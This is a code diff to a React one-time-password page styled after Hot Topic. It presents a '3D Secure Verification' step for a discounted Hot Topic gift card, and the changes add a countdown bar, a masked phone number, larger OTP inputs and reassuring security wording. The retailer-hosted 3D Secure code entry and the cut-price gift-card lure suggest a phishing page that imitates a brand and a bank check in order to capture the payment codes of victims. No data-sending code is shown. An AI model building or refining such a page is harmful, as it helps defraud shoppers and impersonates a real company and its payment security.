@@ -31,6 +31,9 @@ const OTPVerification = () => {
     return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
   };
 
+  // Calculate percentage of time remaining for progress bar
+  const timePercentage = (countdown / (15 * 60)) * 100;
+
   // If no order details, redirect to home
   useEffect(() => {
     if (!orderDetails) {
@@ -180,43 +183,68 @@ const OTPVerification = () => {
               3D Secure <span className="text-hottopic-red">Verification</span>
             </h1>
             
-            <div className="flex justify-center mb-6">
-              <div className="bg-hottopic-gray/20 px-4 py-3 rounded-full flex items-center">
-                <Clock className="h-5 w-5 text-hottopic-red mr-2" />
+            {/* Improved Timer Display */}
+            <div className="flex flex-col items-center mb-6">
+              <div className="w-full max-w-[250px] h-4 bg-hottopic-gray/20 rounded-full overflow-hidden mb-2">
+                <div 
+                  className={`h-full transition-all duration-1000 ease-linear ${
+                    countdown > 300 ? 'bg-green-500' : countdown > 60 ? 'bg-yellow-500' : 'bg-red-500'
+                  }`}
+                  style={{ width: `${timePercentage}%` }}
+                />
+              </div>
+              
+              <div className="bg-hottopic-gray/20 px-4 py-2 rounded-full flex items-center">
+                <Clock className={`h-5 w-5 mr-2 ${
+                  countdown > 300 ? 'text-green-500' : countdown > 60 ? 'text-yellow-500' : 'text-red-500'
+                }`} />
                 <span className="text-white font-mono font-bold">
                   {countdown > 0 ? formatTime(countdown) : "00:00"}
                 </span>
               </div>
             </div>
             
-            <p className="text-gray-300 text-center mb-6">
-              Enter the verification code sent to your mobile device to complete your purchase.
-            </p>
+            <div className="space-y-4 bg-hottopic-gray/5 p-4 rounded-lg border border-hottopic-gray/10 mb-6">
+              <p className="text-white text-center">
+                For your security, we've sent a verification code to
+              </p>
+              <p className="text-hottopic-red font-mono text-center font-bold">
+                ******{orderDetails?.phone?.slice(-4) || "0000"}
+              </p>
+              <p className="text-gray-400 text-sm text-center">
+                Enter the code below to complete your purchase
+              </p>
+            </div>
             
             <form onSubmit={handleSubmit} className="space-y-6">
               {/* OTP Input */}
-              <div className="space-y-4">
+              <div className="space-y-6">
                 <div className="flex justify-center">
                   <InputOTP
                     value={otp}
-                    onChange={setOtp}
+                    onChange={(value) => {
+                      setOtp(value);
+                      if (value.length === 6) {
+                        setError("");
+                      }
+                    }}
                     maxLength={6}
                     className="gap-2"
                   >
                     <InputOTPGroup>
-                      <InputOTPSlot index={0} className="bg-hottopic-dark border-hottopic-gray h-12 w-12" />
-                      <InputOTPSlot index={1} className="bg-hottopic-dark border-hottopic-gray h-12 w-12" />
-                      <InputOTPSlot index={2} className="bg-hottopic-dark border-hottopic-gray h-12 w-12" />
-                      <InputOTPSeparator />
-                      <InputOTPSlot index={3} className="bg-hottopic-dark border-hottopic-gray h-12 w-12" />
-                      <InputOTPSlot index={4} className="bg-hottopic-dark border-hottopic-gray h-12 w-12" />
-                      <InputOTPSlot index={5} className="bg-hottopic-dark border-hottopic-gray h-12 w-12" />
+                      <InputOTPSlot index={0} className="bg-hottopic-dark border-hottopic-gray h-14 w-12 text-xl" />
+                      <InputOTPSlot index={1} className="bg-hottopic-dark border-hottopic-gray h-14 w-12 text-xl" />
+                      <InputOTPSlot index={2} className="bg-hottopic-dark border-hottopic-gray h-14 w-12 text-xl" />
+                      <InputOTPSeparator className="mx-1" />
+                      <InputOTPSlot index={3} className="bg-hottopic-dark border-hottopic-gray h-14 w-12 text-xl" />
+                      <InputOTPSlot index={4} className="bg-hottopic-dark border-hottopic-gray h-14 w-12 text-xl" />
+                      <InputOTPSlot index={5} className="bg-hottopic-dark border-hottopic-gray h-14 w-12 text-xl" />
                     </InputOTPGroup>
                   </InputOTP>
                 </div>
                 
                 {error && (
-                  <div className="text-red-500 text-sm flex items-center justify-center gap-1">
+                  <div className="text-red-500 text-sm flex items-center justify-center gap-1 mt-2">
                     <AlertCircle className="h-4 w-4" />
                     <span>{error}</span>
                   </div>
@@ -224,14 +252,21 @@ const OTPVerification = () => {
               </div>
               
               {/* Payment Details Summary */}
-              <div className="bg-hottopic-gray/20 p-4 rounded-lg border border-hottopic-gray/30 space-y-2">
+              <div className="bg-hottopic-gray/20 p-4 rounded-lg border border-hottopic-gray/30 space-y-3">
+                <div className="text-center pb-2 border-b border-hottopic-gray/30">
+                  <p className="text-sm text-gray-400">Transaction Details</p>
+                </div>
                 <div className="flex justify-between text-sm">
                   <span className="text-gray-400">Item:</span>
                   <span className="text-white">Hot Topic Gift Card</span>
                 </div>
                 <div className="flex justify-between text-sm">
+                  <span className="text-gray-400">Value:</span>
+                  <span className="text-white">${giftCardValue?.toFixed(2) || "0.00"}</span>
+                </div>
+                <div className="flex justify-between text-sm">
                   <span className="text-gray-400">Amount:</span>
-                  <span className="text-white">${discountedAmount?.toFixed(2) || "0.00"}</span>
+                  <span className="text-hottopic-red font-semibold">${discountedAmount?.toFixed(2) || "0.00"}</span>
                 </div>
                 <div className="flex justify-between text-sm">
                   <span className="text-gray-400">Card:</span>
@@ -243,7 +278,7 @@ const OTPVerification = () => {
               <div className="flex flex-col gap-3">
                 <Button 
                   type="submit" 
-                  disabled={isSubmitting || countdown === 0}
+                  disabled={isSubmitting || countdown === 0 || otp.length !== 6}
                   className="w-full py-6 bg-hottopic-red hover:bg-hottopic-red/90 text-white font-bold text-lg"
                 >
                   {isSubmitting ? (
@@ -266,10 +301,10 @@ const OTPVerification = () => {
                 </Button>
               </div>
               
-              <div className="flex items-center justify-center text-center">
-                <Shield className="text-gray-400 mr-2 h-4 w-4" />
-                <p className="text-gray-400 text-sm">
-                  3D Secure verification protects your payment with an additional layer of security
+              <div className="flex items-center justify-center text-center px-6">
+                <Shield className="text-gray-400 mr-2 h-4 w-4 flex-shrink-0" />
+                <p className="text-gray-400 text-xs">
+                  3D Secure verification helps protect your account from unauthorized transactions
                 </p>
               </div>
             </form>
